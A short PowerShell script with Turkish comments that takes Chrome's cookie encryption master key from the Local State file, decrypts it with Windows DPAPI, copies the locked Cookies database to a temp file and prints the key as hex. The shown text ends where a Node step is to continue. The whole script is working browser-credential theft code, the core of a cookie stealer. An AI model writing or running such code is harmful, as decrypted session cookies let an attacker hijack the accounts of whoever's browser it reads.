Add-Type -AssemblyName System.Security

# 1. Chrome Local State'den encrypted key al
$localState = Get-Content "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State" -Raw | ConvertFrom-Json
$encryptedKeyB64 = $localState.os_crypt.encrypted_key
$encryptedKey = [System.Convert]::FromBase64String($encryptedKeyB64)

# DPAPI prefix (DPAPI) kaldır (ilk 5 byte: "DPAPI")
$encryptedKey = $encryptedKey[5..($encryptedKey.Length - 1)]

# DPAPI ile çöz
$masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedKey, $null,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser
)

# 2. Cookie DB'yi kopyala (Chrome açıkken lock var, kopyayla)
$cookieSource = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies"
$cookieCopy   = "$env:TEMP\vfs_cookies_tmp.db"
Copy-Item $cookieSource $cookieCopy -Force

# 3. SQLite sorgusu (System.Data.SQLite yok — binary okuma ile)
# node ile devam et, key'i hex olarak yaz
$keyHex = ($masterKey | ForEach-Object { $_.ToString("x2") }) -join ""
Write-Output "MASTER_KEY=$keyHex"
